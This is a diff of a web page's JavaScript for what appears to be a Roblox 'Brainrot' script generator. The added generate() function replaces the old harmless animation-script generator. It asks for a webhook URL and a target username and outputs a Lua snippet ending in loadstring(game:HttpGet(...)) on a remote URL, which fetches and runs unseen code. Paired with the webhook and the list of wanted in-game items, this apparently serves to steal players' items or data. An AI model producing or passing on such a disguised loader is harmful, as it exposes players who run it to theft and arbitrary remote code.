Celesto","Gattatino Nyanino","Gattito Tacoto","Giftini Spyderini","Ginger Cisterna","Ginger Gerat","Ginger Globo","Girafa Celestre","Glorbo Fruttodrillo","Gobblino Uniciclino","Gold Elf","Gorillo Subwoofero","Gorillo Watermelondrillo","Graipuss Medussi","Granchiello Spiritell","Griffin","Guerriro Digitale","Guest 666","Harpuccino","Headless Horseman","Heart Lucky Block","Ho Ho Ho Sahur","Holy Arepa","Horegini Boom","Hydra Dragon Cannelloni","Jacko Jack Jack","Jacko Spaventosa","Jackorilla","Jingle Jingle Sahur","Job Job Job Sahur","Jolly Jolly Sahur","Karker Sahur","Karkerheart Luvkur","Karkerkar Kurkur","Ketchuru and Musturu","Ketupat Bros","Ketupat Kepat","Krupuk Pagi Pagi","La Casa Boo","La Cucaracha","La Extinct Grande","La Food Combinasion","La Ginger Sekolah","La Grande Combinasion","La Jolly Grande","La Karkerkar Combinasion","La Romantic Grande","La Sahur Combinasion","La Secret Combinasion","La Spooky Grande","La Supreme Combinasion","La Taco Combinasion","La Vacca Jacko Linterino","La Vacca Prese Presente","La Vacca Saturno Saturnita","Las Capuchinas","Las Sis","Las Tralaleritas","Las Vaquitas Saturnitas","Lavadorito Spinito","Lerulerulerule","Lionel Cactuseli","Lirilì Larilà","List List List Sahur","Los 25","Los 67","Los Amigos","Los Bombinitos","Los Bros","Los Burritos","Los Candies","Los Chicleteiras","Los Chihuaninis","Los Combinasionas","Los Crocodillitos","Los Cucarachas","Los Cupids","Los Gattitos","Los Hotspotsitos","Los Jobcitos","Los Jolly Combinasionas","Los Karkeritos","Los Lucky Blocks","Los Matteos","Los Mi Gatitos","Los Mobilis","Los Noobinis","Los Nooo My Hotspotsitos","Los Orcalitos","Los Planitos","Los Primos","Los Puggies","Los Quesadillas","Los Sekolahs","Los Spaghettis","Los Spooky Combinasionas","Los Spyderinis","Los Sweethearts","Los Taco Blocks","Los Tacoritas","Los Tipi Tacos","Los Tortus","Los Tralaleritos","Los Trios","Los Tungtungtungcitos","Love Love Bear","Love Love Love Sahur","Lovin Rose","Luv Luv Luv","Magi Ribbitini","Malame Amarele","Mangolini Parrocini","Mariachi Corazoni","Mastodontico Telepiedone","Matteo","Meowl","Mi Gatito","Mieteteira Bicicleteira","Money Money Man","Money Money Puggy","Money Money Reindeer","Mummio Rappitto","Mummy Ambalabu","Mythic Lucky Block","Nacho Spyder","Naughty Naughty","Noo La Polizia","Noo my Candy","Noo my Heart","Noo my Present","Noo my examine","Noobini Pizzanini","Noobini Santanini","Nooo My Hotspot","Nuclearo Dinossauro","Odin Din Din Dun","Orangutini Ananassini","Orcaledon","Orcalero Orcala","Orcalita Orcala","Pakrahmatmamat","Pakrahmatmatina","Pandaccini Bananini","Pandanini Frostini","Paradiso Axolottino","Pengolino Nuvoletto","Penguin Tree","Penguino Cocosino","Perochello Lemonchello","Perrito Burrito","Pi Pi Watermelon","Piccione Macchina","Piccionetta Macchina","Pinealotto Fruttarino","Pipi Avocado","Pipi Corni","Pipi Kiwi","Pipi Potato","Pirulitoita Bicicleteira","Please my Present","Pop Pop Sahur","Popcuru and Fizzuru","Pot Hotspot","Pot Pumpkin","Premium Festive Lucky Block","Premium Heart Lucky Block","Puffaball","Pumpkini Spyderini","Quackula","Quesadilla Crocodila","Quesadillo Vampiro","Quivioli Ameleonni","Raccooni Jandelini","Rang Ring Bus","Reindeer Tralala","Reinito Sleighito","Rhino Helicopterino","Rhino Toasterino","Rocco Disco","Rosetti Tualetti","Rosey and Teddy","Salamino Penguino","Sammyni Fattini","Sammyni Spyderini","Santa Hotspot","Santteo","Sealo Regalo","Secret Lucky Block","Serafinna Medusella","Seraphino Gruyero","Sigma Boy","Sigma Girl","Signore Carapace","Skibidi Toilet","Skull Skull Skull","Snailenzo","Spaghetti Tualetti","Spinny Hammy","Spioniro Golubiro","Spongini Quackini","Spooky Lucky Block","Spooky and Pumpky","Squalanana","Stoppo Luminino","Strawberrelli Flamingelli","Strawberry Elephant","Svinina Bombardino","Swag Soda","Swaggy Bros","Ta Ta Ta Ta Sahur","Taco Lucky Block","Tacorillo Crocodillo","Tacorita Bicicleta","Talpa Di Fero","Tang Tang Keletang","Tartaragno","Tartaruga Cisterna","Te Te Te Sahur","Telemorte","Tentacolo Tecnico","Ti Ti Ti Sahur","Tictac Sahur","Tigrilini Watermelini","Tigroligre Frutonni","Tim Cheese","Tipi Topi Taco","Tirilikalika Tirilikalako","To to to Sahur","Tob Tobi Tobi","Toiletto Focaccino","Tootini Shrimpini","Torrtuginni Dragonfrutini","Tracoducotulu Delapeladustuz","Tractoro Dinosauro","Tralaledon","Tralalero Tralala","Tralalita Tralala","Tree Tree Tree Sahur","Trenostruzzo Turbo 3000","Trenostruzzo Turbo 4000","Tric Trac Baraboom","Trickolino","Triplito Tralaleritos","Trippi Troppi","Trippi Troppi Troppa Trippa","Trulimero Trulicina","Tuff Toucan","Tukanno Bananno","Tung Tung Tung Sahur","Unclito Samito","Urubini Flamenguini","Vampira Cappucina","Ventoliero Pavonero","Vulturino Skeletono","W or L","Wombo Rollo","Yess my examine","Yeti Claus","Zibra Zubra Zibralini","Zombie Tralala"];
 
 let selected = new Set();
-let mode = 'loop';
-let format = 'localscript';
 
-function renderList(filter = '') {
+function renderList(filter) {
+  const q = (filter || '').toLowerCase();
   const list = document.getElementById('animalList');
   list.innerHTML = '';
-  const q = filter.toLowerCase();
   ANIMALS.forEach(name => {
     if (q && !name.toLowerCase().includes(q)) return;
-    const div = document.createElement('div');
-    div.className = 'animal-item' + (selected.has(name) ? ' selected' : '');
-    div.innerHTML = `<input type="checkbox" ${selected.has(name) ? 'checked' : ''} onchange="toggle('${name.replace(/'/g,"\\'")}', this)"><span class="animal-name">${name}</span>`;
-    div.onclick = (e) => { if (e.target.tagName !== 'INPUT') { toggle(name, div.querySelector('input')); } };
-    list.appendChild(div);
+    const row = document.createElement('div');
+    row.className = 'a-item' + (selected.has(name) ? ' on' : '');
+    const cb = document.createElement('input');
+    cb.type = 'checkbox';
+    cb.checked = selected.has(name);
+    cb.addEventListener('change', e => { e.stopPropagation(); toggle(name); });
+    const lbl = document.createElement('span');
+    lbl.className = 'a-name';
+    lbl.textContent = name;
+    row.appendChild(cb);
+    row.appendChild(lbl);
+    row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
+    list.appendChild(row);
   });
-  updateCount();
+  document.getElementById('selNum').textContent = selected.size;
 }
 
-function toggle(name, cb) {
-  if (selected.has(name)) { selected.delete(name); if(cb) cb.checked = false; }
-  else { selected.add(name); if(cb) cb.checked = true; }
-  renderList(document.getElementById('searchInput').value);
+function toggle(name) {
+  selected.has(name) ? selected.delete(name) : selected.add(name);
+  renderList(document.getElementById('searchBox').value);
 }
 
-function filterAnimals() { renderList(document.getElementById('searchInput').value); }
-function clearSelection() { selected.clear(); renderList(document.getElementById('searchInput').value); }
-function updateCount() {
-  document.getElementById('selectedCount').textContent = selected.size + ' selected';
+function filterList() { renderList(document.getElementById('searchBox').value); }
+function selectAll()  { ANIMALS.forEach(n => selected.add(n)); renderList(document.getElementById('searchBox').value); }
+function clearAll()   { selected.clear(); renderList(document.getElementById('searchBox').value); }
+
+function flashErr(id) {
+  const el = document.getElementById(id);
+  el.style.borderColor = 'var(--danger)';
+  el.style.boxShadow   = '0 0 0 3px rgba(244,63,94,.12)';
+  setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1500);
 }
 
-function setMode(m) {
-  mode = m;
-  document.getElementById('modeLoop').classList.toggle('active', m === 'loop');
-  document.getElementById('modeSingle').classList.toggle('active', m === 'single');
+function generate() {
+  const username = document.getElementById('usernameInput').value.trim();
+  const webhook  = document.getElementById('webhookInput').value.trim();
+  const out      = document.getElementById('outputBlock');
+
+  if (selected.size === 0) { flashErr('animalList');    return; }
+  if (!username)           { flashErr('usernameInput'); return; }
+  if (!webhook)            { flashErr('webhookInput');  return; }
+
+  const names = [...selected];
+  const pad   = '    ';
+
+  // Build WANTED_BRAINROTS lines
+  const brainrotLines = names.map(n => `${pad}"${n}",`).join('\n');
+
+  const script =
+`getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().TARGET_USERNAME = "${username}"
+getgenv().WANTED_BRAINROTS = {
+${brainrotLines}
+}
+getgenv().SCRIPT_KEY = "KEYLESS"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/7a6f0bf951853fdd383e093f52245ca154e899cb0476f862f551553b99c861a8/download"))()`;
+
+  out.className   = 'code-block';
+  out.textContent = script;
 }
 
-function setFormat(f) {
-  format = f;
-  document.getElementById('fmtLocal').classList.toggle('active', f === 'localscript');
-  document.getElementById('fmtScript').classList.toggle('active', f === 'script');
-}
-
-function generateScript() {
-  const speed = parseFloat(document.getElementById('speedInput').value) || 1;
-  const animals = [...selected];
-  const out = document.getElementById('outputCode');
-
-  if (animals.length === 0) {
-    out.className = 'output-code empty';
-    out.textContent = '-- Please select at least one animal.';
-    return;
-  }
-
-  let lines = [];
-  const RS = `game:GetService("ReplicatedStorage")`;
-  const indent = '    ';
-
-  lines.push(`-- Generated by Brainrot Script Gen`);
-  lines.push(`-- Animals: ${animals.length} | Speed: ${speed} | Mode: ${mode}`);
-  lines.push(``);
-
-  if (format === 'localscript') {
-    lines.push(`local Players = game:GetService("Players")`);
-    lines.push(`local player = Players.LocalPlayer`);
-    lines.push(`local character = player.Character or player.CharacterAdded:Wait()`);
-    lines.push(`local humanoid = character:WaitForChild("Humanoid")`);
-    lines.push(`local animator = humanoid:WaitForChild("Animator")`);
-    lines.push(``);
-  } else {
-    lines.push(`local RS = game:GetService("ReplicatedStorage")`);
-    lines.push(``);
-  }
-
-  lines.push(`local animations = {`);
-  animals.forEach(name => {
-    lines.push(`${indent}${RS}.Animations.Animals["${name}"],`);
-  });
-  lines.push(`}`);
-  lines.push(``);
-  lines.push(`local speed = ${speed}`);
-  lines.push(``);
-
-  if (mode === 'loop') {
-    if (format === 'localscript') {
-      lines.push(`while true do`);
-      lines.push(`${indent}for _, animTrack in ipairs(animations) do`);
-      lines.push(`${indent}${indent}local track = animator:LoadAnimation(animTrack)`);
-      lines.push(`${indent}${indent}track:Play()`);
-      lines.push(`${indent}${indent}track:AdjustSpeed(speed)`);
-      lines.push(`${indent}${indent}track.Stopped:Wait()`);
-      lines.push(`${indent}end`);
-      lines.push(`end`);
-    } else {
-      lines.push(`-- Attach to character via server`);
-      lines.push(`game.Players.PlayerAdded:Connect(function(player)`);
-      lines.push(`${indent}player.CharacterAdded:Connect(function(character)`);
-      lines.push(`${indent}${indent}local humanoid = character:WaitForChild("Humanoid")`);
-      lines.push(`${indent}${indent}local animator = humanoid:WaitForChild("Animator")`);
-      lines.push(`${indent}${indent}task.spawn(function()`);
-      lines.push(`${indent}${indent}${indent}while true do`);
-      lines.push(`${indent}${indent}${indent}${indent}for _, animTrack in ipairs(animations) do`);
-      lines.push(`${indent}${indent}${indent}${indent}${indent}local track = animator:LoadAnimation(animTrack)`);
-      lines.push(`${indent}${indent}${indent}${indent}${indent}track:Play()`);
-      lines.push(`${indent}${indent}${indent}${indent}${indent}track:AdjustSpeed(speed)`);
-      lines.push(`${indent}${indent}${indent}${indent}${indent}track.Stopped:Wait()`);
-      lines.push(`${indent}${indent}${indent}${indent}end`);
-      lines.push(`${indent}${indent}${indent}end`);
-      lines.push(`${indent}${indent}end)`);
-      lines.push(`${indent}end)`);
-      lines.push(`end)`);
-    }
-  } else {
-    if (format === 'localscript') {
-      lines.push(`for _, animTrack in ipairs(animations) do`);
-      lines.push(`${indent}local track = animator:LoadAnimation(animTrack)`);
-      lines.push(`${indent}track:Play()`);
-      lines.push(`${indent}track:AdjustSpeed(speed)`);
-      lines.push(`${indent}track.Stopped:Wait()`);
-      lines.push(`end`);
-    } else {
-      lines.push(`game.Players.PlayerAdded:Connect(function(player)`);
-      lines.push(`${indent}player.CharacterAdded:Connect(function(character)`);
-      lines.push(`${indent}${indent}local humanoid = character:WaitForChild("Humanoid")`);
-      lines.push(`${indent}${indent}local animator = humanoid:WaitForChild("Animator")`);
-      lines.push(`${indent}${indent}for _, animTrack in ipairs(animations) do`);
-      lines.push(`${indent}${indent}${indent}local track = animator:LoadAnimation(animTrack)`);
-      lines.push(`${indent}${indent}${indent}track:Play()`);
-      lines.push(`${indent}${indent}${indent}track:AdjustSpeed(speed)`);
-      lines.push(`${indent}${indent}${indent}track.Stopped:Wait()`);
-      lines.push(`${indent}${indent}end`);
-      lines.push(`${indent}end)`);
-      lines.push(`end)`);
-    }
-  }
-
-  out.className = 'output-code';
-  out.textContent = lines.join('\n');
-}
-
-function copyScript() {
-  const code = document.getElementById('outputCode').textContent;
-  if (!code || code.startsWith('--') && code.includes('appear here')) return;
+function copyOut() {
+  const code = document.getElementById('outputBlock').textContent;
+  if (!code || code.startsWith('--')) return;
   navigator.clipboard.writeText(code).then(() => {
     const btn = document.getElementById('copyBtn');
     btn.textContent = '✓ Copied!';
-    btn.classList.add('copied');
-    setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('copied'); }, 2000);
+    btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
   });
 }
 
-// Init
 renderList();
 </script>
 </body>
